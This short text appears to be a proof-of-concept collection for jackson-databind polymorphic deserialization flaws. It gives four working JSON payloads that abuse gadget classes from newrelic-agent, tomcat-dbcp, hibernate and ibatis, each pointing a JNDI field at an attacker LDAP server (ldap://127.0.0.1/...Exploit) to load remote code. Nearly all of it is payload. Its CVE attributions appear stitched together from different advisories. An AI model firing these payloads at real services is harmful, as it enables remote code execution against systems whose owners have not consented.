FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, 
related to com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource

newrelic-agent
```json
["com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource", {"jndiLocation":"ldap://127.0.0.1:1288/Exploitt"}]
```
tomcat-dbcp
```json
["org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource", {"dataSourceName":"ldap://127.0.0.1:1399/Exploit"}]
```

This is PoC with two different gadgets to reproduce CVE-2018-5968 which can be used to exploit the default typing in jackson-databind.
```json
{
  "id": 1111,
  "obj": [
    "org.hibernate.jmx.StatisticsService",
    {
      "sessionFactoryJNDIName": "ldap://127.0.0.1/EvilConstructor"
    }
  ]
}
```
```json
{
  "id": 1111,
  "obj": [
    "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
    {
      "properties":
        {
          "data_source": "ldap://127.0.0.1/EvilConstructor"
        }
    }
  ]
}
```
